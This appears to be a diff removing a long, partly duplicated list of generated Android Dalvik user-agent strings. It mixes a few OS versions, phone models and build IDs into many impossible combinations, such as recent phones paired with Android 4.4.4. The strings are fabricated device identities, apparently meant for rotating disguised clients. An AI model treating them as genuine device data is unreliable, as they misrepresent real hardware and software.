-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/PPR1.910397.817)"
-
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/LMY47X)"
-
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/NRD90M)",
